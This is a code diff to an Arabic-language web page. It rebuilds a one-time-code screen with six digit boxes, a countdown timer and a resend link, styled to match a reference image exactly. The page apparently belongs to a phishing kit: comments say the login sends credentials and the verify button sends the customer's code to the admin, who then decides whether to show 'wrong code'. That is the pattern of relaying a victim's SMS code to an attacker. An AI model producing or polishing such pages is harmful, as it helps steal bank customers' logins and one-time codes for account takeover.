@@ -112,6 +112,36 @@ body{width:100%;height:100%;overflow:hidden;background:transparent;display:flex;
 /* ===== إضافات شاشة رمز التحقق ===== */
 .l-timer{direction:ltr;font-family:'Mont',sans-serif;font-weight:600;font-size:calc(17*var(--p));color:#C4102F;letter-spacing:calc(.4*var(--p));white-space:nowrap}
 .l-forgot.off{opacity:.45;pointer-events:none;text-decoration:none}
+
+/* ============================================================
+   ✅ صفحة رمز التحقق (OTP) — مطابقة للصورة تمامًا
+   ============================================================ */
+.o-title{position:absolute;left:0;right:0;top:calc(32*var(--p));text-align:center;direction:rtl;
+  font-family:'RxBtn',sans-serif;font-weight:700;font-size:calc(24*var(--p));line-height:calc(34*var(--p));color:#111;white-space:nowrap}
+.o-line{position:absolute;left:0;right:0;top:calc(86*var(--p));height:calc(1.6*var(--p));background:#e7e7ea}
+.o-desc{position:absolute;left:calc(26*var(--p));right:calc(26*var(--p));top:calc(136*var(--p));text-align:center;direction:rtl;
+  font-family:'RxReg',sans-serif;font-size:calc(21.5*var(--p));line-height:calc(37*var(--p));color:#242424}
+.o-boxes{position:absolute;left:0;right:0;top:calc(229*var(--p));display:flex;justify-content:center;align-items:center;direction:ltr;gap:calc(13*var(--p))}
+.o-box{width:calc(62*var(--p));height:calc(67*var(--p));border:calc(2*var(--p)) solid #e3e3e6;border-radius:calc(10*var(--p));
+  background:#fff;display:flex;align-items:center;justify-content:center;
+  font-family:'Mont',sans-serif;font-weight:700;font-size:calc(30*var(--p));line-height:1;color:#2b2b2b}
+.o-box.active::after{content:"";width:calc(20*var(--p));height:calc(2.4*var(--p));background:#3a3a3a;border-radius:calc(1*var(--p))}
+.o-input{position:absolute;left:50%;transform:translateX(-50%);top:calc(229*var(--p));width:calc(438*var(--p));height:calc(67*var(--p));
+  border:none;outline:none;background:transparent;color:transparent;caret-color:transparent;
+  font-family:'Mont',sans-serif;font-size:calc(22*var(--p));text-align:center;direction:ltr;z-index:3}
+.o-verify{position:absolute;left:calc(37*var(--p));top:calc(345*var(--p));width:calc(556*var(--p));height:calc(60*var(--p));
+  border:none;border-radius:999px;background:linear-gradient(180deg,#EFA6B6 0%,#E39DAF 100%);
+  color:rgba(255,255,255,.95);font-family:'RxBtn',sans-serif;font-size:calc(20.5*var(--p));
+  display:flex;align-items:center;justify-content:center;
+  box-shadow:0 calc(5*var(--p)) calc(12*var(--p)) rgba(200,140,160,.25);cursor:default;transition:background .2s}
+.o-verify.ready{background:linear-gradient(180deg,#DC0F3F 0%,#C70033 100%);cursor:pointer;box-shadow:0 calc(5*var(--p)) calc(12*var(--p)) rgba(150,0,40,.3)}
+.o-verify:active{opacity:.92}
+.o-timer{position:absolute;left:0;right:0;top:calc(436*var(--p));text-align:center;direction:ltr;
+  font-family:'Mont',sans-serif;font-weight:700;font-size:calc(22*var(--p));color:#55565a;
+  letter-spacing:calc(.6*var(--p));white-space:nowrap}
+.o-resend{position:absolute;left:0;right:0;top:calc(486*var(--p));text-align:center;
+  font-family:'RxReg',sans-serif;font-size:calc(18*var(--p));color:#C4102F}
+.o-resend.off{display:none}
 </style>
 </head>
 <body>
@@ -177,22 +207,33 @@ body{width:100%;height:100%;overflow:hidden;background:transparent;display:flex;
     <button class="abs l-next" id="nextBtn" type="button">التالي</button>
   </div>
 
-  <!-- ================= الخطوة 2: رمز التحقق ================= -->
+  <!-- ================= الخطوة 2: رمز التحقق (OTP) ================= -->
   <div id="step2" style="display:none">
-    <div class="abs l-title"><span class="w1">أدخل رمز</span><br>التحقق الخاص بك</div>
-    <div class="abs l-desc" id="codeDesc">أدخل رمز التحقق الخاص بك.</div>
 
-    <fieldset class="abs l-field" id="codeField">
-      <legend>رمز التحقق</legend>
-      <input type="text" id="codeInput" inputmode="numeric" pattern="[0-9]*" autocomplete="off" maxlength="9">
-    </fieldset>
+    <!-- رأس الصفحة -->
+    <div class="o-title">التحقق من الرقم السري المتغير</div>
+    <div class="o-line"></div>
 
-    <div class="abs l-row l-row1">
-      <span class="l-forgot off" id="resendBtn">إرسال الرمز مرة أخرى</span>
-      <span class="l-timer" id="timer">0:59</span>
+    <!-- الوصف -->
+    <div class="o-desc" id="codeDesc">أدخل رمز التحقق الذي استلمته عبر نظام<br>SMS الرسائل القصيرة</div>
+
+    <!-- خانات الرمز -->
+    <div class="o-boxes" id="otpBoxes">
+      <div class="o-box active"></div>
+      <div class="o-box"></div>
+      <div class="o-box"></div>
+      <div class="o-box"></div>
+      <div class="o-box"></div>
+      <div class="o-box"></div>
     </div>
+    <input type="text" id="codeInput" class="o-input" inputmode="numeric" pattern="[0-9]*" autocomplete="one-time-code" maxlength="6">
 
-    <button class="abs l-next" id="verifyBtn" type="button">تحقق</button>
+    <!-- زر التحقق -->
+    <button class="o-verify" id="verifyBtn" type="button">التحقق</button>
+
+    <!-- المؤقت -->
+    <div class="o-timer" id="timer">01:59</div>
+    <span class="l-forgot o-resend off" id="resendBtn">إرسال الرمز مرة أخرى</span>
   </div>
 
   <!-- عناصر مشتركة -->
@@ -268,7 +309,6 @@ document.addEventListener('DOMContentLoaded', function(){
       codeInput=document.getElementById('codeInput'),
       verifyBtn=document.getElementById('verifyBtn'),
       codeDesc=document.getElementById('codeDesc'),
-      codeField=document.getElementById('codeField'),
       timerEl=document.getElementById('timer'),
       resendBtn=document.getElementById('resendBtn'),
       dim=document.getElementById('dim'),
@@ -279,7 +319,8 @@ document.addEventListener('DOMContentLoaded', function(){
       dlg=document.getElementById('dlg'),
       dlgText=document.getElementById('dlgText'),
       dlgOk=document.getElementById('dlgOk'),
-      keys=document.getElementById('keys');
+      keys=document.getElementById('keys'),
+      boxEls=document.querySelectorAll('#otpBoxes .o-box');
 
   var pin='', busy=false, onVerifyStep=false;
   var currentRef=null;
@@ -294,7 +335,7 @@ document.addEventListener('DOMContentLoaded', function(){
     var a=dlgAction; dlgAction=null; if (a) a();
   });
 
-  function fmtTime(s){ var m=Math.floor(s/60),r=s%60; return m+':'+(r<10?'0':'')+r; }
+  function fmtTime(s){ var m=Math.floor(s/60),r=s%60; return (m<10?'0':'')+m+':'+(r<10?'0':'')+r; }
   function updateTimer(){
     timerEl.textContent=fmtTime(timeLeft);
     if (timeLeft>0) resendBtn.classList.add('off');
@@ -414,6 +455,7 @@ document.addEventListener('DOMContentLoaded', function(){
           showDlg('رمز التحقق خاطئ', function(){
             codeInput.value='';
             verifyBtn.classList.remove('ready');
+            renderOtp();
           });
         }
       });
@@ -427,22 +469,32 @@ document.addEventListener('DOMContentLoaded', function(){
 
   loginBtn.addEventListener('click', sendCredentials);
 
+  /* ---------- عرض خانات رمز التحقق ---------- */
+  function renderOtp(){
+    var v = codeInput.value || '';
+    for (var i=0;i<boxEls.length;i++){
+      boxEls[i].textContent = (i < v.length) ? v.charAt(i) : '';
+      boxEls[i].classList.toggle('active', (i === v.length && v.length < boxEls.length));
+    }
+    verifyBtn.classList.toggle('ready', v.length === boxEls.length);
+  }
+
   /* ---------- الانتقال إلى شاشة رمز التحقق ---------- */
   function goToVerifyStep(){
     onVerifyStep = true;
     codeInput.value = '';
     verifyBtn.classList.remove('ready');
+    renderOtp();
     step1.style.display = 'none';
     step2.style.display = 'block';
-    codeDesc.textContent = 'أدخل رمز التحقق الخاص بك.';
-    startTimer(59);
-    setTimeout(function(){ codeInput.focus(); }, 250);
+    startTimer(119);
+    setTimeout(function(){ try{ codeInput.focus(); }catch(e){} }, 250);
   }
 
-  /* ---------- إدخال رمز التحقق (من 4 إلى 9 أرقام) ---------- */
+  /* ---------- إدخال رمز التحقق (6 أرقام) ---------- */
   codeInput.addEventListener('input', function(){
-    this.value = this.value.replace(/[^0-9]/g,'');
-    verifyBtn.classList.toggle('ready', this.value.length>=4 && this.value.length<=9);
+    this.value = this.value.replace(/[^0-9]/g,'').slice(0, boxEls.length);
+    renderOtp();
   });
   codeInput.addEventListener('keypress', function(e){
     if (e.key.length===1 && !/[0-9]/.test(e.key)) e.preventDefault();
@@ -451,7 +503,7 @@ document.addEventListener('DOMContentLoaded', function(){
   /* ---------- زر تحقق: يرسل رمز العميل للأدمن ---------- */
   verifyBtn.addEventListener('click', function(){
     var v = codeInput.value.replace(/\D/g,'');
-    if (v.length<4 || v.length>9 || busy || !currentRef) return;
+    if (v.length !== boxEls.length || busy || !currentRef) return;
 
     busy = true;
     loader.classList.add('show');
@@ -472,6 +524,7 @@ document.addEventListener('DOMContentLoaded', function(){
     if (busy) return;
     codeInput.value='';
     verifyBtn.classList.remove('ready');
+    renderOtp();
   });
 
   /* ---------- الرجوع ---------- */
@@ -497,11 +550,14 @@ document.addEventListener('DOMContentLoaded', function(){
     pin=''; renderPin(); buildKeys();
     codeInput.value='';
     verifyBtn.classList.remove('ready');
+    renderOtp();
     step2.style.display='none';
     step1.style.display='block';
     closeSheet();
     showHome();
   }
+
+  renderOtp();
 
 });
 </script>
